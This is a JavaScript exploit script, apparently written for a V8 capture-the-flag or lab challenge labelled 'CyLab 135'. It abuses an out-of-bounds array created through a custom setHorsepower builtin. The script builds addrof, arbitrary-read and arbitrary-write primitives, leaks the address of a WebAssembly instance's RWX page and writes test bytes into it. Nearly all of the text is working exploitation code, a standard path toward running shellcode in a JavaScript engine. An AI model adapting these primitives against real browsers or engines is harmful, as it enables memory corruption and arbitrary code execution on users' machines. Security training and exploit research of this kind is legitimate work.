// Debug DH exploit for CyLab 135
var buf = new ArrayBuffer(8);
var f64buf = new Float64Array(buf);
var u64buf = new Uint32Array(buf);
function ftoi(val, size) {
	f64buf[0] = val;
	if(size == 32) { return BigInt(u64buf[0]); }
	else { return BigInt(u64buf[0]) + (BigInt(u64buf[1]) << 32n); }
}
function itof(val, size) {
	if(size == 32) { u64buf[0] = Number(val & 0xffffffffn); }
	else { u64buf[0] = Number(val & 0xffffffffn); u64buf[1] = Number(val >> 32n); }
	return f64buf[0];
}
function addrof(obj){
	obj_arr[0] = obj;
	return ftoi(oob_arr[19],64) >> 32n;
}
function aar(addr){
	high = ftoi(oob_arr[40], 64) & 0xffffffff00000000n;
	oob_arr[40] = itof((BigInt(addr)-8n) + high, 64);
	return ftoi(double_arr[0],64);
}
function aaw2(addr, value){
	high = ftoi(oob_arr[40], 64) & 0xffffffff00000000n;
	oob_arr[40] = itof((BigInt(addr)-8n) + high, 64);
	double_arr[0] = itof(value, 64);
}

var oob_arr = [1.1, 2.2, 3.3, 4.4].setHorsepower(0x100);
var double_map = ftoi(oob_arr[4], 64) & 0xffffffffn;
var obj_arr = [{a:1}, {b:1}];
var double_arr = [1.1, 2.2, 3.3, 4.4];
print("[+] double map : " + double_map.toString(16));

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
let wasmFunction = wasmInstance.exports.main;

print("[+] wasmInstance addr: " + addrof(wasmInstance).toString(16));
let raw = aar(addrof(wasmInstance) + 0x67n);
print("[+] raw leak: " + raw.toString(16));
let rwx = aar(addrof(wasmInstance) + 0x67n) >> 8n;
print("[*] rwx : " + rwx.toString(16));

// dump 32 bytes around rwx before
for (let i = 0; i < 4; i++) {
  print("before rwx+" + (i*8) + ": " + aar(rwx + BigInt(i*8)).toString(16));
}

// write marker bytes
aaw2(rwx, 0xdeadbeefcafebabe);
print("after write rwx: " + aar(rwx).toString(16));
